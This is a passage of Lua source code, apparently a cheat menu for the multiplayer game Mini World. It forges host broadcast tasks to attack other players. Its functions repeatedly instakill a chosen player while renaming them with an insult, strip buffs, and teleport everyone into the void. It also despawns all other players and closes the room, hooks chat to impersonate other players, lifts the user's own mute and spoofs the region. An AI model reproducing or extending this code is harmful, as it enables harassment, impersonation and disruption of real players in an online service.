            local new_z = z / 100

            GraphicsManager:createGraphicsLine(3, 0, targetUin, 0, 0, 0, size, color, id, new_x, new_y, new_z)
        end
    end
end
end

function sdsj()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效数字（时间值）")
            return
        end
        local tdata = {
            [1] = "gamerule",
            [2] = "setTimLocked",
            [3] = { value }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

-- 待机动作
function djdz()
    for a = 0, 100000 do
        threadpool:wait(3.0)
        CurMainPlayer:playAct(100210)
    end
end

-- 创造爆爆蛋
function czbbd()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    local tdata = {
        [1] = "world",
        [2] = "spawnMob",
        [3] = { new_x, new_y, new_z, 3109, 5, true }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

-- 防止崩溃
function fzbk()
    local BeInvitePanelCtrl, BeInvitePanelModel, BeInvitePanelView = GetInst("MiniUIManager"):GetMVC("BeInvitePanelAutoGen")
    local function BlockInviteEvent()
        ShowGameTipsWithoutFilter("#R提示您：已拦截崩溃")
    end
    
    function ShowActorInvite(isInvite) BlockInviteEvent() end
    
    function BeInvitePanelView:InitMessage(content)
        self.title_label:setText("")
        GetInst("MiniUIManager"):CloseUI("BeInvitePanelAutoGen")
        BlockInviteEvent()
    end
end

-- 防止传送
function ycbr()
    function startMapTeleport(AAA) end
end

function xgcm()
ShowTextInputSafe(function(text)
        AccountManager:requestModifyRole(text, 2, 0,false);
    end)
end

function zdtx()
PlayerCenterFrameHeadChange_OnClick(1);
end

function qcwp()
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x, new_y, new_z = x / 100, y / 100, z / 100

-- 计算范围：从主体位置到周围1000格（游戏内单位）
local range = 1000
local tdata = {
    [1] = "world",
    [2] = "despawnItemByBox",
    [3] = {
        new_x - range, new_y - range, new_z - range,  -- 最小点
        new_x + range, new_y + range, new_z + range   -- 最大点
    }
}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end


function zxyj()
    for a = 0, 1000000 do
        threadpool:wait(0.1)
getglobal("AccRideChangeBtn"):Show()
getglobal("AccRideChangeBtn"):SetPoint("right", "AccRideCallBtn", "left", -75, 0)
end
end

function pmwz()
ShowTextInputSafe(function(text)
        tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "createTimer";
    tdata[3] = {""}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "showTimerTips";
    tdata[3] = {{0},1,text,true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

function kqqx()
local nameList = { 1, 2, 4, 8, 16,32, 256,512,2048}
        for _, enchantId in ipairs(nameList) do

tdata = {}
    tdata[1] = "player";
    tdata[2] = "setActionAttrState";
    tdata[3] = {AccountManager:getUin(),enchantId,true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end

function wsjy()
PermitsCallModuleScript("setSpamPreventionMinutes",0)
PermitsCallModuleScript("setPlayerGamePermits", 0, AccountManager:getUin(), CS_PERMIT_MUTE, false)
PermitsCallModuleScript("setPlayerMute", AccountManager:getUin())
end


function qhrb()
local country = "JP"
gFunc_setCountry(country)
gFunc_setCountryIP(country)
ShowGameTipsWithoutFilter("Đã chuyển sang khu vực Trung quốc. Hỡi con cháu dân tộc Việt Nam, hãy đoàn kết chống lại Trung quốc hãy tiếp tục chiến đấu tại khu vực Trung quốc cho đến khi không còn ai sót lại")
end

function jjsc()
BanItem(CurMainPlayer:getCurToolID());
	getglobal("MItemTipsFrame"):Hide()
	end
	
	
	
	function mczbj()
	function MapEdit_OnUse(player, world, x, y, z, dir)
local isStartMapEdit = MapEditManager:GetIsStartEdit()
			if not isStartMapEdit then 
				local param = {disableOperateUI = true}
				-- GetInst("UIManager"):Open("MapEdit", param)
				if not GetInst("MiniUIManager"):IsShown("MapEditAutoGen") then
					GetInst("MiniUIManager"):OpenUI("MapEditMainFrame", "miniui/miniworld/ugc_mapEdit", "MapEditAutoGen", param)
				end
				standReportEvent("2001", "MINI_MINEMAP_GAME_1", "", "develop_terraineditor")
			else
				MapEditManager:ExcuteCmdWithRBClicked()
                -- if GetInst("UIManager"):GetCtrl("MapEdit") then
                --     GetInst("UIManager"):GetCtrl("MapEdit"):MapEditUseStatistics()
                -- end
				if GetInst("MiniUIManager"):GetCtrl("MapEdit") then
					GetInst("MiniUIManager"):GetCtrl("MapEdit"):MapEditUseStatistics()
				end
			end
end
end

function jqsw()
local pickedActor = CurMainPlayer:GetPickActor()
local commonNameList = {
    "ice_qicaihua_01", "bossblock_room","aotu_06_leishenzhichui","jiguang01"
}

if pickedActor then
    local objid = pickedActor:getObjId()
    local objType = pickedActor:getObjType()
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,1}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,2}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,520000001314,17}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,18}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5,21}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    for i = 1, #commonNameList do
    local tdata = {
        [1] = "actor",
        [2] = "playBodyEffectByFile",
        [3] = {objid,commonNameList[i], true}
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    tdata = {}
    tdata[1] = "actor";
    tdata[2] = "changeCustomModel";
    tdata[3] = {objid,[=[skin_38]=]}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "actor";
    tdata[2] = "setnickname";
    tdata[3] = {objid,"#b#R天兵天将"}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    
    end
    end
    end
    

function wjzxms()

GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止秒杀\n右边开启秒杀并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000秒杀已停止")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Vui lòng vào phòng trò chơi trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Hiện không có người chơi nào khác trong phòng này")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择秒杀目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要秒杀的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始秒杀")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                if whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                    _G.dtms_enabled = false  -- 停止本次秒杀
                    return
                end
                ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffNgười chơi đã được chọn：" .. targetUin .. "，Bắt đầu Siêu tiêu diệt")
                
                -- 启动秒杀循环
                threadpool:work(function()
                local pickedActor = CurMainPlayer:GetPickActor()
                        if pickedActor then
                            local objid = pickedActor:getObjId()
                            local objType = pickedActor:getObjType()
                    local myUin = AccountManager:getUin()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {objid, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        -- 强制打开箱子UI
                        local forceBoxUI = {
                            [1] = "player",
                            [2] = "forceOpenBoxUI",
                            [3] = {objid, 797}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, forceBoxUI)
                        end)
                        
                        -- 修改昵称
                        local changeName = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {objid, '#R狗'}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeName)
                        end)
                        
                        -- 修改模型
                        local changeModel = {
                            [1] = "actor",
                            [2] = "changeCustomModel",
                            [3] = {objid, "mob_3407"}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)
                        end)
                        
                        -- 禁止攻击
                        local disableAttack = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {objid, 32, false}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)
                        
                        -- ===== 设置目标为可攻击状态 =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {objid, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {objid}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效1
                        local effect1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {objid, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, effect1) 
                        end)
                        
                        -- 播放特效2
                        local effect2 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {objid, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, effect2) 
                        end)
                        
                        -- 设置属性
                        local setAttr1 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {objid, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttr1) 
                        end)
                        
                        local setAttr2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {objid, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttr2) 
                        end)
                        
                        -- 造成伤害
                        
                            
                            local hurt = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = {targetUin, objid, 1.8e+308, 0}  -- 修正：使用 targetUin
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, hurt) 
                            end)
                       
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffBị tấn công " .. loopCount .. " Mạng")
                        end
                        
                        threadpool:wait(0.0001)  -- 修正等待时间
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {objid, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Khả năng tấn công của mục tiêu đã được khôi phục")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Chu kỳ tiêu diệt tức thì đã kết thúc, tổng số đòn tấn công " .. loopCount .. " Mạng")
                end
                end)  -- 结束 threadpool:work
            end  -- 结束 ctrl:EnterFriendHomeBtn_OnClick
        end  -- 结束 elseif
    end  -- 结束 function(userData, btnType)
)  -- 结束 dualBtnBox
end


function zxph()
InitGameAPI()
GameVmTriggerInit()
local playerUin = AccountManager:getUin()

-- 获取准心位置
local ret, posx, posy, posz = GameVM.Player:getAimPos(playerUin)

if ret == ErrorCode.OK then
    -- 准心位置转换为方块坐标
    local centerX = math.floor(posx)
    local centerY = math.floor(posy)
    local centerZ = math.floor(posz)
    
    ShowGameTipsWithoutFilter("#c00ff00准心指向: " .. centerX .. ", " .. centerY .. ", " .. centerZ)
    ShowGameTipsWithoutFilter("#cFFAA00破坏3x3区域")
    
    -- 破坏3x3区域内的方块
    for dx = -1, 1 do
        for dy = -1, 1 do
            for dz = -1, 1 do
                local blockX = centerX + dx
                local blockY = centerY + dy
                local blockZ = centerZ + dz
                
                local tdata = {
                    [1] = "block",
                    [2] = "destroyBlock",
                    [3] = { blockX, blockY, blockZ, false }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                threadpool:wait(0.01)  -- 稍微延迟，避免发送过快
            end
        end
    end
else
    ShowGameTipsWithoutFilter("#cFF0000获取准心位置失败")
end
end
function qtxk()
if ClientCurGame:isInGame() and CurWorld and CurWorld:getOWID() and AccountManager:getMultiPlayer() > 0 then
            local num = ClientCurGame:getNumPlayerBriefInfo()
            for i = 1, num do
                local briefInfo = ClientCurGame:getPlayerBriefInfo(i-1)
                if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                    local new_x = x / 100
                    local new_y = y / 100
                    local new_z = z / 100
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setPosition";
                    tdata[3] = {briefInfo.uin,new_x,-99,new_z}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)   
                end
            end
        end
        end


function yfgb()
tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "createTimer";
    tdata[3] = {""}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "startBackwardTimer";
    tdata[3] = {1,5,false}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "showTimerTips";
    tdata[3] = {{0},1,[=[#R房间既将关闭:#B]=],true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
ShowGameTipsWithoutFilter("OK")


threadpool:wait(5.0)  -- 在协程中等待
 local myUin = AccountManager:getUin()
    
    -- 获取所有玩家并遍历
    local playerCount = ClientCurGame:requireArrayOfAllPlayers()
    for i = 1, playerCount do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
        -- 清除目标玩家
        local removeData = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { targetUin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeData)
        
        tdata = {}
    tdata[1] = "gamerule";
    tdata[2] = "setAllowMidwayJoin";
    tdata[3] = {0}
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    end
    end
    end

-- ==================== 模仿发言相关 ====================
local nicknameCache = {}

function getNickname(uin)
    if nicknameCache[uin] then return nicknameCache[uin] end
    
    local nickname = nil
    if ClientCurGame and ClientCurGame:isInGame() and CurWorld and CurWorld:getOWID() then
        local num = ClientCurGame:getNumPlayerBriefInfo() or 0
        for i = 1, num do
            local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
            if briefInfo and briefInfo.uin == uin and briefInfo.uin > 1000 and briefInfo.nickname then
                nickname = briefInfo.nickname
                break
            end
        end
    end
    
    if not nickname and GameVM and GameVM.Player then
        local _, wjmc11 = GameVM.Player:getNickname(uin)
        nickname = wjmc11 or nil
    end
    
    if nickname then nicknameCache[uin] = nickname end
    return nickname
end

function ClearNicknameCache()
    nicknameCache = {}
    ShowGameTipsWithoutFilter("昵称缓存已清空，将重新获取玩家昵称")
end

function MffyByPlayerUin(Uin, Text)
    if not Uin or tonumber(Uin) <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000模仿Uin无效，请重新选择！")
        _G.customImitateUin = nil
        return
    end
    
    Text = tostring(Text or "")
    if Text == "" then
        ShowGameTipsWithoutFilter("#cff0000发言内容不能为空！")
        return
    end
    
    local playerName = getNickname(Uin)
    if not playerName then
        ShowGameTipsWithoutFilter("#cff0000所选玩家不存在，无法广播！")
        _G.customImitateUin = nil
        return
    end
    
    trigger()
    
    if not ScriptSupportTask or not ScriptSupportTask.reportTaskToHost or not SSTASKID then
        ShowGameTipsWithoutFilter("#cff0000广播接口缺失，无法发送消息！")
        return
    end
    
    local tdata = {
        [1] = "chat",
        [2] = "sendChat",
        [3] = { "#L" .. playerName .. "#n：#n#cffffff" .. Text, 1, 0 }
    }
    pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
end

function SetImitateUin(newUin)
    local validUin = tonumber(newUin) or 0
    local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
    
    if validUin <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000无效玩家Uin！需大于1000")
        return
    end
    
    if whitelist[validUin] then
        ShowGameTipsWithoutFilter("#R禁止模仿VIP玩家发言", 3)
        return
    end
    
    local playerName = getNickname(validUin)
    if not playerName then
        ShowGameTipsWithoutFilter("#cff0000玩家不存在！")
        return
    end
    
    trigger()
    
    if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
        ClientCurGame.sendChat = function(self, ...)
            local args = {...}
            local Text = tostring(args[1] or "")
            MffyByPlayerUin(_G.customImitateUin, Text)
        end
        _G._IsSendChatHooked = true
    end
    
    _G.customImitateUin = validUin
    if validUin == selfUin then
        ShowGameTipsWithoutFilter("已恢复自身发言")
    else
        ShowGameTipsWithoutFilter(playerName .. "#c00ffff 已切换为模仿该玩家发言（立即生效）")
    end
end

-- 模仿发言
function fzbr()
    _G.customImitateUin = nil
    _G._IsSendChatHooked = false
    
    if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
        ClientCurGame.sendChat = function(self, ...)
            local args = {...}
            local Text = tostring(args[1] or "")
            MffyByPlayerUin(_G.customImitateUin, Text)
        end
        _G._IsSendChatHooked = true
        ShowGameTipsWithoutFilter("聊天拦截已生效，请从房员列表选择模仿的玩家")
    else
        ShowGameTipsWithoutFilter("#cff0000聊天拦截初始化失败！sendChat接口未找到")
    end
    
    ShowPlayerList(function(uin) SetImitateUin(uin) end, "模仿发言")
end

-- 关闭模仿发言
function gbmf()
    _G.customImitateUin = AccountManager:getUin()
    SetImitateUin(AccountManager:getUin())
    ShowGameTipsWithoutFilter("已恢复自身发言")
end

-- ==================== 改名框功能封装 ====================
function ShowTextInputSafe(callback, title)
    -- 备份原有按钮回调函数
    local oldModify = NickModifyFrameModifyBtn_OnClick
    local oldModifyAbroad = NickModifyFrameModifyBtn_OnClickCallbackAbroad
    local oldCancel = CancelNickBtn_OnClick

    -- 打开输入弹窗
    getglobal("NickModifyFrame"):Show()

    -- 设置弹窗标题
    local titleCtrl = getglobal("NickModifyFrameTitle")
    if titleCtrl and titleCtrl.setText then
        titleCtrl:setText(title or "输入文字")
    end

    -- 获取输入框控件，清除原生字数限制
    local editBox = getglobal("NickModifyFrameContentNameEdit")
    if editBox and editBox.setMaxChar then
        -- 直接拉到超大值，不做复原
        editBox:setMaxChar(999999)
    end

    -- 还原原始函数（只恢复按钮事件，不再重置输入框字符限制）
    local function restoreOriginalFunc()
        NickModifyFrameModifyBtn_OnClick = oldModify
        NickModifyFrameModifyBtn_OnClickCallbackAbroad = oldModifyAbroad
        CancelNickBtn_OnClick = oldCancel
        -- 删除了恢复maxChar的代码，不再重置字数限制
    end

    -- 重写确认按钮点击事件
    function NickModifyFrameModifyBtn_OnClick()
        if not editBox then return end
        local inputText = editBox:GetText()
        if inputText == "" then
            ShowGameTipsWithoutFilter("输入内容不能为空")
            return
        end
        getglobal("NickModifyFrame"):Hide()
        editBox:Clear()
        restoreOriginalFunc()
        if callback then callback(inputText) end
    end

    -- 海外分支共用确认逻辑
    function NickModifyFrameModifyBtn_OnClickCallbackAbroad()
        NickModifyFrameModifyBtn_OnClick()
    end

    -- 重写取消按钮
    function CancelNickBtn_OnClick()
        getglobal("NickModifyFrame"):Hide()
        restoreOriginalFunc()
    end
end

-- 指定buff
function zdbf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效buff ID")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                return
            end
            local tdata = {
                [1] = "buff",
                [2] = "addBuff",
                [3] = { uin, value, 1, 0 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "玩家buff")
    end)
end

function gypf()
    ShowPlayerList(function(targetUin)
        ShowTextInputSafe(function(text)
            local value = tonumber(text)
            if not value then
                ShowGameTipsWithoutFilter("请输入有效皮肤数字")
                return
            end
            local skinId = "skin_" .. value
            local tdata = {
                [1] = "actor",
                [2] = "changeCustomModel",
                [3] = { targetUin, skinId }
            }
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter("#c00ffff已为玩家 " .. targetUin .. " 设置皮肤: " .. skinId)
            end)
        end, "输入皮肤数字（例如 1 代表 skin_1）")
    end, "选择要设置皮肤的玩家")
end

-- 指定飞行
function zdfx()
    ShowPlayerList(function(uin)
        local tdata = {
            [1] = "player",
            [2] = "changPlayerMoveType",
            [3] = { uin, 1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "飞行")
end

function pctv6()
    ShowPlayerList(function(uin)
        if not uin then return end
        
        -- Danh sách các trạng thái (enchantId) bạn muốn áp dụng
        local nameList = { 1, 2, 4, 8, 16, 32, 256, 512, 2048 }

        for _, enchantId in ipairs(nameList) do
            local taskData = {
                [1] = "player",
                [2] = "setActionAttrState",
                [3] = { uin, enchantId, true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, taskData)
        end
        
        ShowGameTipsWithoutFilter("#c00ffffĐã áp dụng trạng thái cho người chơi!")
    end, "Chọn người chơi")
end

function zdgz()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        CurMainPlayer:setUin(uin)--改观战的目标迷你号
                CurMainPlayer:setSpectatorMode(1)--设置观战
                CurMainPlayer:setUin(AccountManager:getUin())--改观战的目标迷你号
                CurMainPlayer:setSpectatorMode(0)--设置观战
    end, "指定观战")
end

function zxsw()
-- 获取玩家准心指向的实体objid
local pickedActor = CurMainPlayer:GetPickActor()

if pickedActor then
    local objid = pickedActor:getObjId()
    local objType = pickedActor:getObjType()
    
    print("========== 准心指向 ==========")
    print("对象objid:", objid)
    print("对象类型:", objType)
    
    -- 不管是不是生物，都播放特效
    local commonNameList = {
    "ice_qicaihua_01", "140113_1", "pumpkin_fireworks2", "horse_3437",
    "horse_4506_3", "horse_4662_3","horse_4502","horse_4564_3","horse_4645_3","horse_4616_3","horse_4554_3","horse_3457","horse_4503"
}
    for i = 1, #commonNameList do
    local tdata = {
        [1] = "actor",
        [2] = "playBodyEffectByFile",
        [3] = {objid,commonNameList[i], true}
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    
    
    end
    ShowGameTipsWithoutFilter("#c00ff00准心指向对象 objid: " .. objid .. " 已播放特效")
    print("==============================")
else
    print("没有准心指向的对象")
    ShowGameTipsWithoutFilter("#cFF0000没有准心指向的对象")
end
end

function zdjr()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 举人+禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止举人\n右边开启举人并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止举人 =====
            _G.xr_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000举人已停止")
            
            -- 可选：恢复所有玩家移动
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.xr_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}  -- true = 恢复移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffff已恢复所有玩家移动")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启举人 =====
            _G.xr_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                _G.xr_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                _G.xr_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择举人目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要举人的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始举人")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffff已选择玩家：" .. targetUin .. "，开始循环举人到自己头上")
                
                -- 启动举人循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.xr_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 举人功能：传送到头上 =====
                        local myX, myY, myZ = CurMainPlayer:getPosition(0, 0, 0)
                        local target_x, target_y, target_z = myX / 100, myY / 100 + 4, myZ / 100
                        
                        local tdata1 = {
                            [1] = "player",
                            [2] = "setPosition",
                            [3] = { targetUin, target_x, target_y, target_z }
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) 
                        end)
                        -- =================================
                        
                        -- ===== 禁止移动功能 =====
                        local tdata2 = {}
